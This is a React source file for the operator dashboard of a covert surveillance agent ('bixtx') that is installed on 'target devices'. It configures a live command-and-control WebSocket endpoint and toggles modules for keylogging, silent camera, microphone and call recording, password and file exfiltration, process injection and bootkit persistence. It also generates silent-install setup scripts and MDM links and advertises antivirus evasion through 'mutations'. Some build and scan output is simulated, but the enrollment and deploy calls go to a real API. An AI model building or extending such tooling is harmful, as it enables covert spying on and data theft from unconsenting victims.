import { useState, useEffect } from "react";
import {
  Server, Terminal, ArrowRight, Check, Download,
  RefreshCw, Upload, Shield, Zap, HardDrive, Cpu,
  Activity, Lock, Signal, Wifi as WifiIcon, Link, Copy, ExternalLink,
} from "lucide-react";
import { OS, OS_COLOR, OS_ICON, OS_LABEL, DeployLinkPanel } from "../shared";

export function LinkAgentPage({ show }: { show: (msg: string, kind?: "success"|"error"|"info") => void }) {
  const [tab, setTab] = useState<"builder"|"deploy"|"fleet"|"capabilities"|"mutations">("builder");

  const [targetOS, setTargetOS] = useState<OS>("windows");
  const [c2Endpoint, setC2Endpoint] = useState("wss://bixtx.onrender.com/agent");
  const [beaconInterval, setBeaconInterval] = useState("30");
  const [building, setBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildLog, setBuildLog] = useState<string[]>([]);
  const [built, setBuilt] = useState(false);
  const [buildOS, setBuildOS] = useState<OS | null>(null);

  const [modules, setModules] = useState<Record<string, boolean>>({
    keylogger: true, screenshot: true, camera: true, microphone: true,
    clipboard: true, geoLocation: true, wifiProbe: true, networkScan: false,
    processMonitor: true, fileExfil: false, callRecorder: true,
    socialMedia: true, browserHistory: true, contactsExfil: false, aiLearning: true,
    imsiCapture: false, voicePrint: true, facialRecog: true, torTunnel: false,
    airgapExfil: false, processInject: false, bootkit: false,
  });

  const API_BASE = "https://bixtx.onrender.com/v1";

  type FleetAgent = { id: string; device: string; os: OS; ip: string; version: string; status: string; lastPing: string; dataQueue: string; mutations: number };
  const [FLEET, setFLEET] = useState<FleetAgent[]>([]);
  const [fleetLoading, setFleetLoading] = useState(false);

  useEffect(() => {
    const token = sessionStorage.getItem("token");
    if (!token) return;
    setFleetLoading(true);
    fetch(`${API_BASE}/devices`, { headers: { Authorization: `Bearer ${token}` } })
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        const raw: { id:string; name:string; os?:string; platform?:string; ip?:string; version?:string; status?:string; lastSeen?:string|number; dataQueueMB?:number; mutationCount?:number }[] = data.devices ?? data ?? [];
        setFLEET(raw.map(d => ({
          id:        d.id,
          device:    d.name,
          os:        (d.os ?? d.platform ?? "windows") as OS,
          ip:        d.ip ?? "—",
          version:   d.version ?? "—",
          status:    d.status === "online" ? "active" : d.status === "warning" ? "warning" : "offline",
          lastPing:  d.lastSeen ? (() => { const s = Math.round((Date.now() - Number(d.lastSeen)) / 1000); return s < 10 ? "Now" : s < 60 ? `${s}s ago` : s < 3600 ? `${Math.round(s/60)}m ago` : `${Math.round(s/3600)}h ago`; })() : "—",
          dataQueue: d.dataQueueMB != null ? `${d.dataQueueMB.toFixed(1)} MB` : "0 B",
          mutations: d.mutationCount ?? 0,
        })));
      })
      .catch(() => {})
      .finally(() => setFleetLoading(false));
  }, []);

  type EnrollData = { enrollUrl: string; shortUrl: string; linkId: string; expiresAt: string; installCommands: Record<string, string> };
  const [enrollData, setEnrollData] = useState<EnrollData | null>(null);
  const [enrollLoading, setEnrollLoading] = useState(false);
  const [enrollLabel, setEnrollLabel] = useState("");
  const [deploying, setDeploying] = useState(false);
  const [deployTarget, setDeployTarget] = useState("");

  const handleGenerateLink = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    setEnrollLoading(true);
    setEnrollData(null);
    try {
      const r = await fetch(`${API_BASE}/devices/enroll`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ label: enrollLabel || `${OS_LABEL[targetOS]} agent`, ttl: "24h" }),
      });
      if (!r.ok) throw new Error("Server error");
      const data: EnrollData = await r.json();
      setEnrollData(data);
      show("Install link generated — expires in 24h", "success");
    } catch {
      show("Failed to generate link — check server connection", "error");
    } finally {
      setEnrollLoading(false);
    }
  };

  const handleDeploy = async () => {
    const token = sessionStorage.getItem("token");
    if (!token) { show("Not authenticated", "error"); return; }
    const targets = deployTarget ? [deployTarget] : FLEET.filter(a => a.status === "active").map(a => a.id);
    if (!targets.length) { show("No online devices to deploy to", "error"); return; }
    setDeploying(true);
    try {
      const jobId = `job-${Date.now()}`;
      const r = await fetch(`${API_BASE}/deploy/job`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ jobId, type: "update", version: "4.7.2", deviceIds: targets }),
      });
      if (!r.ok) throw new Error("Server error");
      const d = await r.json();
      show(`Deploy job ${jobId} dispatched to ${d.dispatched}/${d.total} device(s)`, "success");
    } catch {
      show("Deploy failed — check server connection", "error");
    } finally {
      setDeploying(false);
    }
  };

  const handleMutate = () => {
    setMutating(true);
    setMutProgress(0);
    let cur = 0;
    const iv = setInterval(() => {
      cur = Math.min(100, cur + 3);
      setMutProgress(cur);
      if (cur >= 100) {
        clearInterval(iv);
        setMutating(false);
        setMutLog((prev: typeof mutLog) => [{
          ts: new Date().toISOString().replace("T"," ").slice(0,16),
          event: "Global signature rotation + hash randomisation",
          target: "All active agents",
          result: "OK",
        }, ...prev]);
        show("Mutation pushed to all active agents", "success");
      }
    }, 80);
  };

  const [mutating, setMutating] = useState(false);
  const [mutProgress, setMutProgress] = useState(0);
  const [mutLog, setMutLog] = useState<{ ts:string; event:string; target:string; result:string }[]>([]);

  const [avScanResult, setAvScanResult] = useState<null | { engine: string; detected: boolean }[]>(null);
  const [avScanning, setAvScanning] = useState(false);

  const MODULE_DEFS: { key: string; label: string; category: string; risk: "low"|"medium"|"high"|"critical"; desc: string }[] = [
    { key:"keylogger",     label:"Keylogger",           category:"Input",     risk:"high",     desc:"Captures all keystrokes in real-time" },
    { key:"screenshot",    label:"Screen Capture",      category:"Visual",    risk:"medium",   desc:"Periodic & triggered screenshots" },
    { key:"camera",        label:"Camera Recording",    category:"Visual",    risk:"critical", desc:"Silent front/rear camera capture" },
    { key:"microphone",    label:"Microphone",          category:"Audio",     risk:"critical", desc:"Ambient audio recording" },
    { key:"clipboard",     label:"Clipboard Monitor",   category:"Input",     risk:"medium",   desc:"Intercepts copy/paste content" },
    { key:"geoLocation",   label:"GPS / Location",      category:"Location",  risk:"medium",   desc:"Real-time GPS and cell tower triangulation" },
    { key:"wifiProbe",     label:"WiFi Probe",          category:"Network",   risk:"medium",   desc:"Scans nearby networks & probe history" },
    { key:"networkScan",   label:"LAN Scanner",         category:"Network",   risk:"high",     desc:"Maps all devices on local network" },
    { key:"processMonitor",label:"Process Monitor",     category:"System",    risk:"low",      desc:"Running processes, memory usage" },
    { key:"fileExfil",     label:"File Exfiltration",   category:"System",    risk:"critical", desc:"Silent upload of targeted files" },
    { key:"callRecorder",  label:"Call Recorder",       category:"Audio",     risk:"critical", desc:"Records voice calls (VoIP + cellular)" },
    { key:"socialMedia",   label:"Social Intercept",    category:"Comms",     risk:"high",     desc:"Reads messages from 9 platforms" },
    { key:"browserHistory",label:"Browser History",     category:"Comms",     risk:"medium",   desc:"URLs, logins, saved passwords" },
    { key:"contactsExfil", label:"Contacts / Calendar", category:"Comms",     risk:"high",     desc:"Address book and calendar events" },
    { key:"aiLearning",    label:"AI Behavioral Learn", category:"AI",        risk:"medium",   desc:"Builds target behavioral profile" },
    { key:"imsiCapture",   label:"IMSI Capture",        category:"Network",   risk:"critical", desc:"Intercepts IMSI / cellular identity" },
    { key:"voicePrint",    label:"Voice Fingerprint",   category:"Audio",     risk:"high",     desc:"Identifies speakers by voice biometrics" },
    { key:"facialRecog",   label:"Facial Recognition",  category:"Visual",    risk:"critical", desc:"Identifies faces in camera frames" },
    { key:"torTunnel",     label:"Tor C2 Tunnel",       category:"Network",   risk:"high",     desc:"Routes C2 traffic through Tor network" },
    { key:"airgapExfil",   label:"Air-Gap Bridge",      category:"Network",   risk:"critical", desc:"Exfil via ultrasonic/RF on isolated nets" },
    { key:"processInject", label:"Process Injection",   category:"System",    risk:"critical", desc:"Injects into trusted processes" },
    { key:"bootkit",       label:"Bootkit Persistence", category:"System",    risk:"critical", desc:"Pre-boot persistence, survives reinstalls" },
  ];

  const RISK_COLOR: Record<string, string> = { low:"#10b981", medium:"#f59e0b", high:"#ef4444", critical:"#3b82f6" };

  const BUILD_STEPS: Record<OS, string[]> = {
    windows: [
      "[*] Initializing MSVC toolchain...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling surveillance modules (RELEASE)...",
      "[*] Applying PE-section obfuscation...",
      "[*] Embedding polymorphic loader...",
      "[*] Code signing with EV certificate...",
      "[*] Packing with custom UPX variant...",
      "[✓] bixtx-agent-v4.7.2-win64.exe — 14.7 MB",
    ],
    macos: [
      "[*] Initializing LLVM / clang toolchain...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling universal binary (arm64 + x86_64)...",
      "[*] Signing with Developer ID certificate...",
      "[*] Notarizing with Apple servers...",
      "[*] Packing installer .pkg...",
      "[✓] bixtx-agent-v4.7.2-macos-universal.pkg — 12.8 MB",
    ],
    linux: [
      "[*] Initializing GCC 14 toolchain...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling ELF binary (amd64)...",
      "[*] Stripping debug symbols...",
      "[*] Installing systemd service unit...",
      "[*] Compressing with zstd...",
      "[✓] bixtx-agent-v4.7.2-linux-amd64.deb — 11.2 MB",
    ],
    android: [
      "[*] Initializing Android NDK r27...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling ARM64 native library...",
      "[*] Assembling APK with zipalign...",
      "[*] Signing with debug keystore...",
      "[*] Applying APK obfuscation (ProGuard)...",
      "[✓] bixtx-agent-v4.7.2-android.apk — 9.4 MB",
    ],
    ios: [
      "[*] Initializing Xcode 16 toolchain...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling Swift + ObjC runtime...",
      "[*] Code signing (Enterprise cert)...",
      "[*] Bundling IPA archive...",
      "[✓] bixtx-agent-v4.7.2-ios.ipa — 11.9 MB",
    ],
    harmony: [
      "[*] Initializing DevEco Studio toolchain...",
      "[*] Injecting enrollment key BTX-2026-ALPHA...",
      "[*] Compiling ArkTS + C++ native modules...",
      "[*] Signing HAP package...",
      "[*] Packing HarmonyOS archive...",
      "[✓] bixtx-agent-v4.7.2-harmonyos.hap — 8.6 MB",
    ],
  };

  const handleBuild = (osTarget: OS) => {
    setBuildOS(osTarget);
    setBuilding(true);
    setBuilt(false);
    setBuildProgress(0);
    setBuildLog([]);
    const steps = BUILD_STEPS[osTarget];
    let i = 0;
    const iv = setInterval(() => {
      if (i < steps.length) {
        setBuildLog((prev: string[]) => [...prev, steps[i]]);
        setBuildProgress(Math.round(((i + 1) / steps.length) * 100));
        i++;
      } else {
        clearInterval(iv);
        setBuilding(false);
        setBuilt(true);
        show(`Agent compiled for ${OS_LABEL[osTarget]} — ready to deploy`, "success");
      }
    }, 550);
  };

  const handleAVScan = () => {
    setAvScanning(true);
    setAvScanResult(null);
    setTimeout(() => {
      setAvScanning(false);
      setAvScanResult([
        { engine:"Windows Defender",  detected:false },
        { engine:"Kaspersky",         detected:false },
        { engine:"Malwarebytes",      detected:false },
        { engine:"CrowdStrike Falcon",detected:false },
        { engine:"SentinelOne",       detected:false },
        { engine:"Carbon Black",      detected:false },
        { engine:"ESET NOD32",        detected:false },
        { engine:"Bitdefender",       detected:false },
        { engine:"Sophos",            detected:true  },
        { engine:"McAfee",            detected:false },
        { engine:"Avast",             detected:false },
        { engine:"Trend Micro",       detected:false },
      ]);
    }, 3500);
  };

  const SUB_TABS: { id: typeof tab; label: string; icon: string }[] = [
    { id:"builder",      label:"Agent Builder",  icon:"🔨" },
    { id:"deploy",       label:"Deployment",     icon:"🚀" },
    { id:"fleet",        label:"Agent Fleet",    icon:"📡" },
    { id:"capabilities", label:"Capabilities",   icon:"⚙️" },
    { id:"mutations",    label:"AI Mutations",   icon:"🧬" },
  ];

  const activeCount = FLEET.filter(a => a.status === "active").length;
  const totalDataMB = FLEET.reduce((s: number, a: FleetAgent) => s + (parseFloat(a.dataQueue) || 0), 0);
  const totalData = totalDataMB > 0 ? `${totalDataMB.toFixed(1)} MB` : "0 B";

  return (
    <div className="max-w-7xl mx-auto px-6 py-8">
      <div className="flex flex-wrap items-start justify-between gap-4 mb-6">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0"
            style={{ background: "linear-gradient(135deg,#3b82f6,#10d9a0)", boxShadow:"0 0 24px rgba(59,130,246,0.4)" }}>
            <Server size={22} color="#fff" />
          </div>
          <div>
            <h1 className="text-2xl font-black" style={{ color:"#e2eaf6" }}>
              Software A — <span style={{ color:"#3b82f6" }}>Link Agent</span>
            </h1>
            <p className="text-sm" style={{ color:"#6b8ab0" }}>
              Ultra-lightweight silent monitoring agent · Installed on target devices · &lt;15 MB
            </p>
          </div>
        </div>
        <div className="flex flex-wrap gap-3">
          {[
            { label:"Active Agents",   val: `${activeCount} / ${FLEET.length || "—"}`, color:"#10b981" },
            { label:"Data Queued",     val: totalData,                                  color:"#10d9a0" },
            { label:"Agent Version",   val: "v4.7.2",                                   color:"#3b82f6" },
            { label:"Node.js Runtime", val: "18 LTS",                                   color:"#f59e0b" },
          ].map(s => (
            <div key={s.label} className="px-4 py-2 rounded-xl text-center"
              style={{ background:`${s.color}12`, border:`1px solid ${s.color}30` }}>
              <div className="text-base font-black" style={{ color:s.color }}>{s.val}</div>
              <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{s.label}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="flex gap-1 mb-6 p-1 rounded-xl w-fit flex-wrap" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
        {SUB_TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all"
            style={{ background: tab===t.id ? "linear-gradient(135deg,#2563eb,#3b82f6)" : "transparent", color: tab===t.id ? "#fff" : "#6b8ab0" }}>
            <span>{t.icon}</span>{t.label}
          </button>
        ))}
      </div>

      {/* BUILDER TAB — honest deployment */}
      {tab === "builder" && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
          <div className="lg:col-span-1 space-y-4">
            {/* Platform selector */}
            <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Target Platform</div>
              <div className="grid grid-cols-3 gap-2">
                {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(id => (
                  <button key={id} onClick={() => { setTargetOS(id); setEnrollData(null); }}
                    className="flex flex-col items-center gap-1 p-2.5 rounded-xl border transition-all"
                    style={{ background: targetOS===id ? `${OS_COLOR[id]}18` : "#030b16", borderColor: targetOS===id ? OS_COLOR[id] : "rgba(59,130,246,0.15)" }}>
                    <span className="text-xl">{OS_ICON[id]}</span>
                    <span className="text-[9px] font-mono font-bold" style={{ color: targetOS===id ? OS_COLOR[id] : "#6b8ab0" }}>{OS_LABEL[id].split(" ")[0].toUpperCase()}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* C2 config */}
            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Agent Configuration</div>
              <div>
                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>C2 WebSocket URL</div>
                <input value={c2Endpoint} onChange={e => setC2Endpoint(e.target.value)}
                  placeholder="wss://your-server:3001"
                  className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
                <div className="text-[10px] mt-1" style={{ color:"#4a6080" }}>Written into .env at setup time</div>
              </div>
              <div>
                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Beacon Interval (seconds)</div>
                <input value={beaconInterval} onChange={e => setBeaconInterval(e.target.value)}
                  type="number" min="5" max="3600"
                  className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#10d9a0" }} />
              </div>
              <div>
                <div className="text-xs font-semibold mb-1" style={{ color:"#b8cce8" }}>Device Label (optional)</div>
                <input value={enrollLabel} onChange={e => setEnrollLabel(e.target.value)}
                  placeholder={`${OS_LABEL[targetOS]} agent`}
                  className="w-full px-3 py-2 rounded-lg text-xs font-mono outline-none"
                  style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#e2eaf6" }} />
              </div>
            </div>

            {/* Generate Install Link */}
            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.3)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Generate Install Link</div>
              <button onClick={handleGenerateLink} disabled={enrollLoading}
                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                style={{ background:"linear-gradient(135deg,#2563eb,#10d9a0)", color:"#fff" }}>
                {enrollLoading ? <><RefreshCw size={14} className="animate-spin" />Generating...</> : <><Link size={14} />Generate Link</>}
              </button>
              {enrollData && (
                <div className="space-y-2">
                  <div className="rounded-lg px-3 py-2 flex items-center gap-2" style={{ background:"#030b16", border:"1px solid rgba(16,217,160,0.3)" }}>
                    <span className="text-xs font-mono truncate flex-1" style={{ color:"#10d9a0" }}>{enrollData.shortUrl}</span>
                    <button onClick={() => { navigator.clipboard.writeText(enrollData.shortUrl); show("Link copied", "success"); }}>
                      <Copy size={12} color="#10d9a0" />
                    </button>
                    <a href={enrollData.enrollUrl} target="_blank" rel="noreferrer">
                      <ExternalLink size={12} color="#3b82f6" />
                    </a>
                  </div>
                  <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
                    Expires: {new Date(enrollData.expiresAt).toLocaleString()}
                  </div>
                  {enrollData.installCommands?.[targetOS] && (
                    <div className="rounded-lg px-3 py-2" style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.2)" }}>
                      <div className="text-[9px] font-mono uppercase mb-1" style={{ color:"#6b8ab0" }}>One-liner install</div>
                      <div className="text-[10px] font-mono break-all" style={{ color:"#b8cce8" }}>{enrollData.installCommands[targetOS]}</div>
                      <button className="mt-1.5 text-[9px] font-mono" style={{ color:"#3b82f6" }}
                        onClick={() => { navigator.clipboard.writeText(enrollData.installCommands[targetOS]); show("Command copied", "success"); }}>
                        Copy command
                      </button>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Deploy to devices */}
            <div className="rounded-2xl p-4 space-y-3" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Deploy to Device</div>
              <select value={deployTarget} onChange={e => setDeployTarget(e.target.value)}
                className="w-full px-3 py-2 rounded-lg text-xs outline-none"
                style={{ background:"#030b16", border:"1px solid rgba(59,130,246,0.25)", color:"#b8cce8" }}>
                <option value="">All online devices ({FLEET.filter(a=>a.status==="active").length})</option>
                {FLEET.filter(a => a.status==="active").map(a => (
                  <option key={a.id} value={a.id}>{a.device} — {a.ip}</option>
                ))}
              </select>
              <button onClick={handleDeploy} disabled={deploying}
                className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm transition-all disabled:opacity-50"
                style={{ background: deploying ? "rgba(59,130,246,0.2)" : "rgba(59,130,246,0.15)", border:"1px solid rgba(59,130,246,0.4)", color:"#3b82f6" }}>
                {deploying ? <><RefreshCw size={14} className="animate-spin" />Deploying...</> : <><Upload size={14} />Push Deploy Job</>}
              </button>
              <div className="text-[10px] font-mono" style={{ color:"#4a6080" }}>
                Sends DEPLOY_JOB to online agents via WebSocket
              </div>
            </div>
          </div>

          <div className="lg:col-span-2 space-y-4">
            <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Download Setup Script</div>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                {([
                  { id:"linux",   label:"Linux",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
                  { id:"macos",   label:"macOS",          ext:".sh",  note:"Node.js 18+",    kind:"script" as const },
                  { id:"windows", label:"Windows (WSL)",  ext:".bat", note:"WSL2 required",  kind:"script" as const },
                  { id:"android", label:"Android Termux", ext:".sh",  note:"Termux app",     kind:"script" as const },
                  { id:"ios",     label:"iOS",            ext:".md",  note:"Xcode + Swift",  kind:"native" as const },
                  { id:"harmony", label:"HarmonyOS",      ext:".md",  note:"DevEco Studio",  kind:"native" as const },
                ] as const).map(p => (
                  <button key={p.id}
                    onClick={() => {
                      setTargetOS(p.id as OS);
                      let content = "";
                      if (p.id === "windows") {
                        content = `@echo off\nREM bixtx Agent — Windows WSL Setup\nwsl --install -d Ubuntu\nREM Inside WSL: cd software-a && npm install --omit=dev && node src/index.js\npause`;
                      } else if (p.id === "android") {
                        content = `#!/data/data/com.termux/files/usr/bin/bash\npkg update -y && pkg install -y nodejs\ncd software-a && npm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env\nnohup node src/index.js > /tmp/bixtx.log 2>&1 &\necho "Agent running. Log: /tmp/bixtx.log"`;
                      } else if (p.id === "ios") {
                        content = `# bixtx iOS Agent — Build & Deploy Guide\n\n## Requirements\n- macOS with Xcode 15+\n- Apple Developer account (Enterprise Program for silent distribution)\n- software-ios/ directory from this repository\n\n## Build Steps\n1. Open software-ios/Package.swift in Xcode\n2. Set your Team ID and Bundle ID in Signing & Capabilities\n3. Configure C2 endpoint: edit Sources/BixtxAgent/Config.swift\n   C2_WS_URL = "${c2Endpoint}"\n   BEACON_INTERVAL = ${beaconInterval}\n4. Archive: Product → Archive\n5. Distribute via:\n   - TestFlight (testing, up to 10,000 devices)\n   - Enterprise certificate (silent, no App Store)\n   - MDM profile push via get.bixtx.com/l/{enrollId}\n\n## MDM Distribution\nGenerate an install link (left panel) → iOS devices visit the link → MDM profile installs the agent silently.\n`;
                      } else if (p.id === "harmony") {
                        content = `# bixtx HarmonyOS Agent — Build & Deploy Guide\n\n## Requirements\n- DevEco Studio 4.0+\n- Huawei Developer account\n- software-harmony/ directory from this repository\n\n## Build Steps\n1. Open software-harmony/ in DevEco Studio\n2. Configure C2 endpoint: edit entry/src/main/ets/agent/Config.ets\n   C2_WS_URL: "${c2Endpoint}"\n   BEACON_INTERVAL: ${beaconInterval}\n3. Build: Build → Build HAP(s)\n4. Sign with your enterprise certificate\n5. Distribute via:\n   - Huawei AppGallery Connect (enterprise channel)\n   - Direct HAP sideload via adb: hdc app install bixtx-agent.hap\n   - MDM push via get.bixtx.com/l/{enrollId}\n\n## Silent Install via MDM\nGenerate an install link (left panel) → target visits link → HAP installs via enterprise channel.\n`;
                      } else {
                        content = `#!/usr/bin/env bash\nset -e\ncd software-a\nnpm install --omit=dev\nprintf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\nLOG_LEVEL=info\\n' > .env\nnode src/index.js`;
                      }
                      const blob = new Blob([content], { type:"text/plain" });
                      const a = document.createElement("a");
                      a.href = URL.createObjectURL(blob);
                      a.download = `bixtx-${p.id}-setup${p.ext}`;
                      a.click();
                      show(`${p.label} setup ${p.kind === "native" ? "guide" : "script"} downloaded`, "success");
                    }}
                    className="flex items-center justify-between px-4 py-3 rounded-xl border transition-all"
                    style={{ background:`${OS_COLOR[p.id as OS]}15`, borderColor: OS_COLOR[p.id as OS] }}>
                    <div className="flex items-center gap-2">
                      <span className="text-lg">{OS_ICON[p.id as OS]}</span>
                      <div className="text-left">
                        <div className="text-xs font-bold" style={{ color:"#e2eaf6" }}>{p.label}</div>
                        <div className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{p.note}</div>
                      </div>
                    </div>
                    <Download size={12} color="#10b981" />
                  </button>
                ))}
              </div>
            </div>

            <div className="rounded-2xl overflow-hidden" style={{ background:"#050410", border:"1px solid rgba(59,130,246,0.22)" }}>
              <div className="px-4 py-2.5 flex items-center gap-2 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#030b16" }}>
                <Terminal size={13} color="#3b82f6" />
                <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Setup Instructions — {OS_LABEL[targetOS]}</span>
              </div>
              <div className="p-4 min-h-48 font-mono text-xs space-y-1.5 overflow-y-auto max-h-72">
                {targetOS === "ios" ? (<>
                  <div style={{ color:"#3b82f6" }}># bixtx iOS Agent — Swift WebSocket C2</div>
                  <div style={{ color:"#6b8ab0" }}># Requirements: macOS + Xcode 15+ + Apple Developer account</div>
                  <div style={{ color:"#b8cce8" }}>open software-ios/Package.swift</div>
                  <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in Sources/BixtxAgent/Config.swift:</div>
                  <div style={{ color:"#10d9a0" }}>{`C2_WS_URL = "${c2Endpoint}"`}</div>
                  <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL = ${beaconInterval}`}</div>
                  <div style={{ color:"#6b8ab0" }}># Archive + distribute via Enterprise cert or TestFlight</div>
                  <div style={{ color:"#6b8ab0" }}># OR: generate a link (left panel) for MDM silent push</div>
                </>) : targetOS === "harmony" ? (<>
                  <div style={{ color:"#f59e0b" }}># bixtx HarmonyOS Agent — ArkTS WebSocket C2</div>
                  <div style={{ color:"#6b8ab0" }}># Requirements: DevEco Studio 4.0+ + Huawei Developer account</div>
                  <div style={{ color:"#b8cce8" }}>deveco-studio software-harmony/</div>
                  <div style={{ color:"#6b8ab0" }}># Set C2 endpoint in entry/src/main/ets/agent/Config.ets:</div>
                  <div style={{ color:"#10d9a0" }}>{`C2_WS_URL: "${c2Endpoint}"`}</div>
                  <div style={{ color:"#10d9a0" }}>{`BEACON_INTERVAL: ${beaconInterval}`}</div>
                  <div style={{ color:"#6b8ab0" }}># Build HAP → sign → deploy via AGC enterprise channel</div>
                  <div style={{ color:"#6b8ab0" }}># OR: hdc app install bixtx-agent.hap  (direct sideload)</div>
                </>) : targetOS === "windows" ? (<>
                  <div style={{ color:"#6b8ab0" }}># 1. Enable WSL2 on Windows (as Administrator):</div>
                  <div style={{ color:"#b8cce8" }}>wsl --install -d Ubuntu</div>
                  <div style={{ color:"#6b8ab0" }}># 2. Inside Ubuntu (WSL), install Node.js:</div>
                  <div style={{ color:"#b8cce8" }}>curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -</div>
                  <div style={{ color:"#b8cce8" }}>sudo apt install -y nodejs</div>
                  <div style={{ color:"#6b8ab0" }}># 3. Transfer software-a/ into WSL, then:</div>
                  <div style={{ color:"#b8cce8" }}>cd software-a && npm install --omit=dev</div>
                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env`}</div>
                  <div style={{ color:"#b8cce8" }}>node src/index.js</div>
                </>) : targetOS === "android" ? (<>
                  <div style={{ color:"#6b8ab0" }}># 1. Install Termux from F-Droid (not Play Store)</div>
                  <div style={{ color:"#6b8ab0" }}># 2. In Termux:</div>
                  <div style={{ color:"#b8cce8" }}>pkg update -y && pkg install -y nodejs</div>
                  <div style={{ color:"#6b8ab0" }}># 3. Transfer software-a/ via adb push or scp, then:</div>
                  <div style={{ color:"#b8cce8" }}>cd software-a && npm install --omit=dev</div>
                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\n' > .env`}</div>
                  <div style={{ color:"#b8cce8" }}>nohup node src/index.js &gt; /tmp/bixtx.log 2&gt;&amp;1 &amp;</div>
                </>) : (<>
                  <div style={{ color:"#6b8ab0" }}># 1. Requires Node.js 18+</div>
                  <div style={{ color:"#b8cce8" }}>cd software-a</div>
                  <div style={{ color:"#b8cce8" }}>npm install --omit=dev</div>
                  <div style={{ color:"#6b8ab0" }}># 2. Configure:</div>
                  <div style={{ color:"#b8cce8" }}>{`printf 'C2_WS_URL=${c2Endpoint}\\nBEACON_INTERVAL=${beaconInterval}\\nLOG_LEVEL=info\\n' > .env`}</div>
                  <div style={{ color:"#6b8ab0" }}># 3. Run:</div>
                  <div style={{ color:"#b8cce8" }}>node src/index.js</div>
                  <div style={{ color:"#10b981" }}># Optional: run as systemd service for persistence</div>
                </>)}
              </div>
            </div>

            <div className="rounded-2xl p-4" style={{ background:"#0a1628", border:"1px solid rgba(59,130,246,0.2)" }}>
              <div className="text-xs font-mono uppercase tracking-widest mb-3" style={{ color:"#6b8ab0" }}>Agent Specifications</div>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                {[
                  { label:"Runtime",    val:"Node.js 18+",     icon:<Server size={13} />,    color:"#10b981" },
                  { label:"Protocol",   val:"WebSocket / WSS", icon:<WifiIcon size={13} />,  color:"#3b82f6" },
                  { label:"Encryption", val:"AES-256-GCM",     icon:<Lock size={13} />,      color:"#f59e0b" },
                  { label:"Beacon",     val:`${beaconInterval}s interval`, icon:<Signal size={13} />, color:"#10d9a0" },
                  { label:"CPU Impact", val:"<1% idle",        icon:<Activity size={13} />,  color:"#10b981" },
                  { label:"DB",         val:"SQLite encrypted", icon:<HardDrive size={13} />, color:"#a855f7" },
                  { label:"Platforms",  val:"Linux · macOS · WSL · Termux · iOS · HarmonyOS", icon:<Cpu size={13} />, color:"#3b82f6" },
                  { label:"Persistence",val:"systemd / launchd", icon:<Shield size={13} />, color:"#10d9a0" },
